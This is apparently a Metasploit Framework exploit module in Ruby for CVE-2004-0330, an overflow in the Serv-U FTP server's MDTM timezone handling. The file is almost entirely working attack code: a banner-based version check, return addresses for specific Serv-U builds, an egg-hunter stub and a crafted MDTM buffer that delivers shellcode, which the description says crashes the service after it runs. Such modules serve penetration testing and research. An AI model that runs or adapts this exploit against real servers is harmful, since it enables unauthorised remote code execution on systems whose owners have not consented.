##
# $Id: servu_mdtm.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Serv-U FTPD MDTM Overflow\',
			\'Description\'    => %q{
					This is an exploit for the Serv-U\\\'s MDTM command timezone
				overflow. It has been heavily tested against versions
				4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with success against
				nt4/2k/xp/2k3. I have also had success against version 3,
				but only tested 1 version/os. The bug is in all versions
				prior to 5.0.0.4, but this exploit will not work against
				versions not listed above. You only get one shot, but it
				should be OS/SP independent.

				This exploit is a single hit, the service dies after the
				shellcode finishes execution.
			},
			\'Author\'         => [ \'spoonm\' ],
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 10394 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2004-0330\'],
					[ \'OSVDB\', \'4073\'],
					[ \'URL\', \'http://archives.neohapsis.com/archives/bugtraq/2004-02/0654.html\'],
					[ \'URL\', \'http://www.cnhonker.com/advisory/serv-u.mdtm.txt\'],
					[ \'URL\', \'http://www.cnhonker.com/index.php?module=releases&act=view&type=3&id=54\'],
					[ \'BID\', \'9751\'],
				],
			\'Privileged\'     => false,
			\'Payload\'        =>
				{
					\'Space\'    => 1000,
					\'BadChars\' => \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\",
					\'StackAdjustment\' => -3500,
				},
			\'Targets\'        =>
				[
					[
						\'Serv-U Uber-Leet Universal ServUDaemon.exe\', # Tested OK - hdm 11/25/2005
						{
							\'Platform\' => \'win\',
							\'Ret\'      => 0x00401877,
						},
					],
					[
						\'Serv-U 4.0.0.4/4.1.0.0/4.1.0.3 ServUDaemon.exe\',
						{
							\'Platform\' => \'win\',
							\'Ret\'      => 0x0040164d,
						},
					],
					[
						\'Serv-U 5.0.0.0 ServUDaemon.exe\',
						{
							\'Platform\' => \'win\',
							\'Ret\'      => 0x0040167e,
						},
					],
				],
			\'DisclosureDate\' => \'Feb 26 2004\',
			\'DefaultTarget\' => 0))

		register_advanced_options(
			[
				OptInt.new(\'SEHOffset\', [ false, \"Offset from beginning of timezone to SEH\", 47 ]),
				OptInt.new(\'ForceDoubling\', [ false, \"1 to force \\\\xff doubling for 4.0.0.4, 0 to disable it, 2 to autodetect\", 2 ]),
			], self.class)

	end

	# From 5.0.0.4 Change Log
	# \"* Fixed bug in MDTM command that potentially caused the daemon to crash.\"
	#
	# Nice way to play it down boys
	#
	# Connected to ftp2.rhinosoft.com.
	# 220 ProFTPD 1.2.5rc1 Server (ftp2.rhinosoft.com) [62.116.5.74]
	#
	# Heh :)

	def check
		connect
		disconnect

		case banner
			when /Serv-U FTP Server v4\\.1/
				print_status(\'Found version 4.1.0.3, exploitable\')
				return Exploit::CheckCode::Vulnerable

			when /Serv-U FTP Server v5\\.0/
				print_status(\'Found version 5.0.0.0 (exploitable) or 5.0.0.4 (not), try it!\');
				return Exploit::CheckCode::Appears

			when /Serv-U FTP Server v4\\.0/
				print_status(\'Found version 4.0.0.4 or 4.1.0.0, additional check.\');
				send_user(datastore[\'USER\'])
				send_pass(datastore[\'PASS\'])
				if (double_ff?())
					print_status(\'Found version 4.0.0.4, exploitable\');
					return Exploit::CheckCode::Vulnerable
				else
					print_status(\'Found version 4.1.0.0, exploitable\');
					return Exploit::CheckCode::Vulnerable
				end

			when /Serv-U FTP Server/
				print_status(\'Found an unknown version, try it!\');
				return Exploit::CheckCode::Detected

			else
				print_status(\'We could not recognize the server banner\')
				return Exploit::CheckCode::Safe
		end

		return Exploit::CheckCode::Safe
	end

	def exploit

		connect_login

		print_status(\"Trying target #{target.name}...\")

		# Should have paid more attention to skylined\'s exploit, only after figuring
		# out how my payloads were getting transformed did I remember seeing \\xff
		# doubling in his CHMOD exploit, arg!
		shellcode = payload.encoded

		case datastore[\'ForceDoubling\']
			when 1
				print_status(\"Forced doubling of all \\\\xff sequences in the encoded payload\")
				shellcode.gsub!(/\\xff/, \"\\xff\\xff\")
			when 0
				print_status(\"Forced doubling has been disabled\")
			when 2
				if (double_ff?())
					print_status(\"Forced doubling enabled after detection of version 4.0.0.4\")
					shellcode.gsub!(/\\xff/, \"\\xff\\xff\")
				end
		end

		# Searcher expects address to start scanning at in edi
		# Since we got here via a pop pop ret, we can just the address of the jmp
		# off the stack, add esp, BYTE -4 ; pop edi

		search_rtag = \"\\x34\\x33\\x32\\x31\" # +1 / 0 / -1 [start, end, stored]
		search_stub = Rex::Arch::X86.searcher(search_rtag)
		search_code = \"\\x83\\xc4\\xfc\\x5f\" + search_stub + \'BB\'
		if (datastore[\'SEHOffset\'] < search_code.length)
			print_error(\"Not enough room for search code, adjust SEHOffset\")
			return
		end

		jump_back = Rex::Arch::X86.jmp_short(\'$+\' + (-1 * search_code.length).to_s) + \'BB\'

		buf = \'MDTM 20031111111111+\' + (\'A\' * (datastore[\'SEHOffset\'] - search_code.length))
		buf << search_code
		buf << jump_back
		buf << [target.ret].pack(\'V\')
		buf << \' /\'
		buf << Rex::Arch::X86.dword_adjust(search_rtag, 1)
		buf << shellcode
		buf << search_rtag

		send_cmd( [buf], false )

		handler
		disconnect
	end

	def double_ff?
		res = send_cmd( [\'P@SW\'], true )
		return (res and res =~ /^500/) ? true : false
	end

end
